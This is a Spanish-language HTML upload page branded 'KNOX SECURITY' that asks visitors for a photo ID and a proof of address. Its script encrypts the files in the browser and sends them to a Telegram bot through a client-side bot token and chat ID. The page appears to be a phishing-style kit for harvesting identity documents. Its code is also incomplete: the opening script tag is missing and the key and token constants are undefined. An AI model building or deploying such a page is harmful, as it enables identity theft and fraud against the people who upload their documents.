<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enviar documentos</title>
<!-- OpenPGP.js v5 (stable API) -->
<script src="https://cdn.jsdelivr.net/npm/openpgp@5.11.0/dist/openpgp.min.js"></script>
<style>
  :root {
    --navy:#173f70; --blue:#1765c4; --blue-light:#eaf2ff;
    --line:#d7e5fb; --ink:#10213d; --muted:#52627a;
    --green:#168747; --green-light:#eaf7ef; --surface:#fff;
    --green-bright:#1aa34a; --green-glow:0 0 0 3px rgba(26,163,74,0.25);
  }
  * { box-sizing:border-box; }
  body {
    margin:0; padding:22px; background:#f3f6fb; color:var(--ink);
    font-family:Arial, Helvetica, sans-serif;
  }
  .page { max-width:1120px; margin:0 auto; background:white; border:1px solid #e1e9f5;
    border-radius:22px; overflow:hidden; box-shadow:0 8px 28px rgba(28,61,105,.09); }
  .hero { background:var(--navy); color:white; padding:30px 38px; display:flex; align-items:center; gap:26px; }
  .hero-icon { width:76px; height:76px; flex:none; }
  .hero-copy { border-left:3px solid rgba(255,255,255,.8); padding-left:28px; }
  h1 { font-size:clamp(2rem,4vw,3rem); margin:0 0 8px; letter-spacing:-1px; }
  .hero p { margin:0; font-size:clamp(1.05rem,2vw,1.4rem); line-height:1.4; }
  main { padding:26px; }
  .identity { display:grid; grid-template-columns:1.6fr 1fr; gap:24px; align-items:center;
    padding:24px; background:var(--blue-light); border:1px solid #c9dcff; border-radius:18px; }
  .person { display:flex; gap:22px; align-items:center; }
  .avatar { width:92px; height:92px; border-radius:50%; flex:none; background:var(--blue);
    display:grid; place-items:center; color:white; }
  .avatar svg { width:52px; height:52px; }
  h2 { font-size:1.65rem; margin:0 0 12px; }
  .details { display:grid; gap:8px; font-size:1.12rem; }
  .detail strong { margin-left:7px; }
  .confirm { border-left:2px solid #a9c3eb; padding:8px 0 8px 26px; display:flex; gap:16px; align-items:center; }
  .check { width:58px; height:58px; border-radius:50%; background:var(--green); color:white;
    display:grid; place-items:center; flex:none; font-size:2rem; font-weight:bold; }
  .confirm h3 { color:#17683a; font-size:1.35rem; margin:0 0 7px; }
  .confirm p { margin:0; font-size:1.05rem; line-height:1.4; color:#263b32; }
  .upload-section { margin-top:22px; padding:22px; border:1px solid var(--line); border-radius:18px; }
  .section-heading { display:flex; align-items:center; gap:16px; margin-bottom:20px; }
  .section-heading svg { width:48px; height:48px; color:var(--navy); flex:none; }
  .section-heading h2 { margin:0 0 4px; color:var(--navy); }
  .section-heading p { margin:0; color:var(--muted); font-size:1.08rem; }
  .uploads { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; }
  .upload-card { border:1.5px solid #cbdcf8; border-radius:16px; padding:18px 16px 16px;
    text-align:center; min-width:0; background:#fff; transition: border-color .2s ease, background .2s ease; }
  .upload-card.loaded { border-color: var(--green-bright); background: #f4fdf7; }
  .upload-card .doc-icon { width:68px; height:68px; color:#1459a8; margin:0 auto 8px; transition: color .2s ease; }
  .upload-card.loaded .doc-icon { color: var(--green); }
  .upload-card h3 { font-size:1.15rem; margin:0 0 5px; }
  .upload-card p { color:var(--muted); margin:0 0 14px; min-height:22px; font-size:.98rem; }
  .upload-btn { border:0; background:var(--blue); color:white; font-size:1.05rem; font-weight:700;
    border-radius:12px; padding:15px 12px; width:100%; cursor:pointer; transition: background .2s ease; }
  .upload-btn:hover { background:#0f55a9; }
  .upload-btn.loaded { background: var(--green); }
  .upload-btn.loaded:hover { background: #0e7a35; }
  .upload-btn:focus-visible, .send:focus-visible, .confirm-choice:focus-visible { outline:4px solid #f2c94c; outline-offset:3px; }

  .file-name {
    display: none;
    margin-top: 12px;
    padding: 10px 14px;
    border-radius: 10px;
    background: var(--green-light);
    border: 1px solid #b8e6c8;
    color: #145b31;
    font-size: .95rem;
    font-weight: 600;
    overflow-wrap: anywhere;
    text-align: left;
    align-items: center;
    gap: 8px;
    animation: fadeInUp .25s ease;
  }
  .file-name.visible { display: flex; }
  .file-name .check-badge {
    width: 22px; height: 22px; flex: none; border-radius: 50%;
    background: var(--green); color: white; display: grid; place-items: center;
    font-size: .8rem; font-weight: bold;
  }
  @keyframes fadeInUp {
    from { opacity: 0; transform: translateY(-4px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  .bottom { display:grid; grid-template-columns:1fr 1fr; gap:18px; margin-top:18px; }
  .help { background:#e8f1ff; border-radius:15px; padding:18px 20px; display:flex; gap:14px; align-items:center; color:#243a5b; }
  .info { width:34px; height:34px; border-radius:50%; background:var(--navy); color:white; display:grid; place-items:center; font-weight:bold; font-size:1.2rem; flex:none; }
  .help p { margin:0; line-height:1.45; font-size:.98rem; }

  .send {
    border:0; border-radius:18px;
    background: linear-gradient(145deg, #1aa34a, #0e7a35);
    color:white; font-size:1.4rem; font-weight:800;
    padding:20px 22px; cursor:pointer;
    letter-spacing:0.3px;
    box-shadow: 0 8px 18px rgba(22,135,71,0.35), 0 2px 0 #0a5e2a inset, 0 -2px 0 #0f7a38 inset;
    transition: all 0.15s ease;
    text-transform: uppercase;
    display: flex; align-items: center; justify-content: center; gap: 8px;
    border: 1px solid #0e7a35;
    position: relative;
  }
  .send:hover {
    background: linear-gradient(145deg, #1ebc56, #0e8c3c);
    box-shadow: 0 10px 24px rgba(22,135,71,0.5), 0 2px 0 #0a5e2a inset, 0 -2px 0 #0f7a38 inset;
    transform: scale(1.01);
  }
  .send:active { transform: scale(0.99); box-shadow: 0 4px 10px rgba(22,135,71,0.4), 0 2px 0 #0a5e2a inset; }
  .send:focus-visible { outline:4px solid #f2c94c; outline-offset:4px; }
  .send:disabled { opacity: .75; cursor: wait; }

  .confirm-row { margin-top:18px; display:flex; align-items:center; justify-content:center; gap:10px; color:#34445b; font-size:1rem; }
  .confirm-row input { width:20px; height:20px; accent-color:var(--green); }
  .notice { text-align:center; color:var(--muted); font-size:.88rem; margin:16px 0 0; }
  .toast { display:none; margin-top:14px; padding:13px 16px; border-radius:12px; background:var(--green-light); color:#145b31; text-align:center; font-weight:600; }
  .toast.error { background: #ffe9e9; color: #a12020; }
  @media (max-width:760px) {
    body { padding:10px; }
    .hero { padding:22px; gap:16px; }
    .hero-icon { width:54px; height:54px; }
    .hero-copy { padding-left:16px; }
    main { padding:15px; }
    .identity { grid-template-columns:1fr; padding:18px; }
    .confirm { border-left:0; border-top:1px solid #b8cdec; padding:18px 0 0; }
    .uploads { grid-template-columns:1fr; }
    .upload-card { display:grid; grid-template-columns:62px 1fr; column-gap:14px; text-align:left; align-items:center; }
    .upload-card .doc-icon { width:56px; height:56px; grid-row:span 3; margin:0; }
    .upload-card h3 { align-self:end; }
    .upload-card p { min-height:0; margin-bottom:8px; }
    .upload-btn { grid-column:1 / -1; }
    .file-name { grid-column: 1 / -1; }
    .bottom { grid-template-columns:1fr; }
    .person { gap:14px; align-items:flex-start; }
    .avatar { width:66px; height:66px; }
    .avatar svg { width:38px; height:38px; }
    .details { font-size:1rem; }
  }
</style>
</head>
<body>
<div class="page">
  <header class="hero">
    <svg class="hero-icon" viewBox="0 0 80 80" fill="none" aria-hidden="true">
      <path d="M17 7h31l17 17v47H17z" fill="white"/>
      <path d="M48 7v18h17" stroke="#173f70" stroke-width="3" stroke-linejoin="round"/>
      <path d="M27 34h25M27 45h25M27 56h15" stroke="#173f70" stroke-width="4" stroke-linecap="round"/>
      <circle cx="59" cy="59" r="16" fill="#fff" stroke="#173f70" stroke-width="2"/>
      <path d="m51 59 5 5 11-12" stroke="#173f70" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <div class="hero-copy">
      <h1>Enviar Documentos</h1>
    </div>
  </header>

  <main>
    <section class="upload-section" aria-labelledby="upload-title">
      <div class="section-heading">
        <svg viewBox="0 0 64 64" fill="none" aria-hidden="true"><path d="M14 5h25l14 14v39H14z" fill="#174a83"/><path d="M39 5v15h14" stroke="white" stroke-width="3"/><path d="M23 31h21M23 41h21M23 51h14" stroke="white" stroke-width="3" stroke-linecap="round"/></svg>
        <div><h2 id="upload-title">Documentos</h2></div>
      </div>

      <div class="uploads">
        <article class="upload-card" id="id-card">
          <svg class="doc-icon" viewBox="0 0 72 72" fill="none" aria-hidden="true"><rect x="5" y="10" width="62" height="49" rx="8" stroke="currentColor" stroke-width="4"/><circle cx="24" cy="29" r="8" fill="currentColor"/><path d="M11 51c1-9 6-14 13-14s12 5 13 14M43 25h17M43 36h17" stroke="currentColor" stroke-width="4" stroke-linecap="round"/></svg>
          <h3>Identificación</h3><p>Ej. Licencia de conducir</p>
          <button class="upload-btn" type="button" data-file="id-file">＋ &nbsp; Seleccionar documento</button>
          <input id="id-file" type="file" accept="image/*,.pdf" hidden>
          <span class="file-name" id="id-file-name"></span>
        </article>
        <article class="upload-card" id="address-card">
          <svg class="doc-icon" viewBox="0 0 72 72" fill="none" aria-hidden="true"><path d="M15 5h29l15 15v47H15z" stroke="currentColor" stroke-width="4" stroke-linejoin="round"/><path d="M44 5v16h15M25 34h27M25 45h27M25 56h19" stroke="currentColor" stroke-width="4" stroke-linecap="round"/></svg>
          <h3>Comprobante de dirección</h3><p>Ej. Factura de Luz o estado de cuenta</p>
          <button class="upload-btn" type="button" data-file="address-file">＋ &nbsp; Seleccionar documento</button>
          <input id="address-file" type="file" accept="image/*,.pdf" hidden>
          <span class="file-name" id="address-file-name"></span>
        </article>
      </div>
    </section>

    <div class="bottom">
      <div class="help"><span class="info">i</span><p><strong>Formatos aceptados:</strong> JPG, PNG o PDF. <br><strong>Cifrado:</strong> sus archivos se cifran antes de enviarse.</p></div>
      <button class="send" id="send-button" type="button">✓ &nbsp; Enviar documentos</button>
    </div>
    <label class="confirm-row"><input type="checkbox" id="confirm-check"> Confirmo que mi información es correcta.</label>
    <div class="toast" id="toast" role="status" aria-live="polite"></div>
    <p class="notice">KNOX SECURITY.</p>
  </main>
</div>

  // ============================================================
  // 🔐 Load public key once
  // ============================================================
  let publicKeyPromise = null;
  function getPublicKey() {
    if (!publicKeyPromise) {
      publicKeyPromise = openpgp.readKey({ armoredKey: MY_PUBLIC_KEY });
    }
    return publicKeyPromise;
  }

  // Encrypt a File -> returns a Blob of armored .pgp
  async function encryptFile(file) {
    const publicKey = await getPublicKey();

    // Read the file as raw bytes
    const fileBytes = new Uint8Array(await file.arrayBuffer());

    const message = await openpgp.createMessage({
      binary: fileBytes,
      filename: file.name
    });

    // Armored text output (ASCII), easier to verify / open anywhere
    const encryptedArmored = await openpgp.encrypt({
      message,
      encryptionKeys: publicKey,
      format: 'armored'
    });

    return new Blob([encryptedArmored], { type: 'application/pgp-encrypted' });
  }

  // ============================================================
  // Standard form logic
  // ============================================================
  const fileInputs = {
    'id-file': document.getElementById('id-file'),
    'address-file': document.getElementById('address-file')
  };

  document.querySelectorAll('[data-file]').forEach(button => {
    button.addEventListener('click', () => {
      document.getElementById(button.dataset.file).click();
    });
  });

  document.querySelectorAll('input[type="file"]').forEach(input => {
    input.addEventListener('change', () => {
      const label = document.getElementById(input.id + '-name');
      const card = document.getElementById(input.id.replace('-file', '-card'));
      const btn = document.querySelector(`[data-file="${input.id}"]`);

      if (input.files.length) {
        const fileName = input.files[0].name;
        label.innerHTML = `<span class="check-badge">✓</span> <span>${fileName}</span>`;
        label.classList.add('visible');
        if (card) card.classList.add('loaded');
        if (btn) {
          btn.classList.add('loaded');
          btn.textContent = '✓  Archivo cargado';
        }
      } else {
        label.innerHTML = '';
        label.classList.remove('visible');
        if (card) card.classList.remove('loaded');
        if (btn) {
          btn.classList.remove('loaded');
          btn.textContent = '＋  Seleccionar documento';
        }
      }
    });
  });

  function showToast(message, isError = false) {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.className = 'toast' + (isError ? ' error' : '');
    toast.style.display = 'block';
    clearTimeout(toast._timeout);
    toast._timeout = setTimeout(() => { toast.style.display = 'none'; }, 8000);
  }

  function resetInputVisual(input) {
    const label = document.getElementById(input.id + '-name');
    const card = document.getElementById(input.id.replace('-file', '-card'));
    const btn = document.querySelector(`[data-file="${input.id}"]`);
    label.innerHTML = '';
    label.classList.remove('visible');
    if (card) card.classList.remove('loaded');
    if (btn) {
      btn.classList.remove('loaded');
      btn.textContent = '＋  Seleccionar documento';
    }
  }

  // ============================================================
  // SEND — encrypt each file BEFORE uploading
  // ============================================================
  document.getElementById('send-button').addEventListener('click', async () => {
    const confirmed = document.getElementById('confirm-check').checked;

    if (!confirmed) {
      showToast('Por favor, confirme primero que su información es correcta.', true);
      return;
    }

    const selectedFiles = [];
    for (const input of Object.values(fileInputs)) {
      if (input.files.length > 0) {
        selectedFiles.push({ input, file: input.files[0] });
      }
    }

    if (selectedFiles.length === 0) {
      showToast('Debe seleccionar al menos un archivo para enviar.', true);
      return;
    }

    const MAX_SIZE_BYTES = 10 * 1024 * 1024;
    for (const { file } of selectedFiles) {
      if (file.size > MAX_SIZE_BYTES) {
        showToast(`El archivo "${file.name}" supera los 10 MB permitidos.`, true);
        return;
      }
    }

    const sendButton = document.getElementById('send-button');
    const originalText = sendButton.innerHTML;
    sendButton.innerHTML = '⏳ &nbsp; Cifrando y enviando...';
    sendButton.disabled = true;
    document.getElementById('toast').style.display = 'none';

    try {
      // 1. Encrypt every file locally, in the browser
      const encrypted = [];
      for (const { file } of selectedFiles) {
        const blob = await encryptFile(file);
        encrypted.push({ originalName: file.name, blob });
      }

      // 2. Notification message (NO filenames — avoids leaking)
      const caption = `📄 *Nuevos documentos cifrados recibidos*\n\n` +
                      `📅 *Fecha:* ${new Date().toLocaleString('es-ES')}\n` +
                      `📎 *Cantidad:* ${encrypted.length} archivo(s)`;

      const msgResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: caption,
          parse_mode: 'Markdown'
        })
      });
      if (!msgResp.ok) {
        const e = await msgResp.json().catch(() => ({}));
        throw new Error(e.description || 'Error en sendMessage');
      }

      // 3. Upload each encrypted blob as .pgp
      let index = 1;
      for (const { blob, originalName } of encrypted) {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, `documento_${index}.pgp`);
        // Caption intentionally does NOT reveal the original filename
        formData.append('caption', `🔐 documento_${index}.pgp (cifrado)`);

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: formData
        });

        if (!response.ok) {
          const e = await response.json().catch(() => ({}));
          throw new Error(e.description || `Error al enviar documento_${index}.pgp`);
        }
        index++;
      }

      showToast(`✅ ¡Listo! ${encrypted.length} documento(s) cifrado(s) y enviado(s).`);

      for (const input of Object.values(fileInputs)) {
        input.value = '';
        resetInputVisual(input);
      }

    } catch (error) {
      console.error('Error:', error);
      showToast(`❌ Error: ${error.message}. Verifique su conexión e intente de nuevo.`, true);
    } finally {
      sendButton.innerHTML = originalText;
      sendButton.disabled = false;
    }
  });
</script>
</body>
</html>
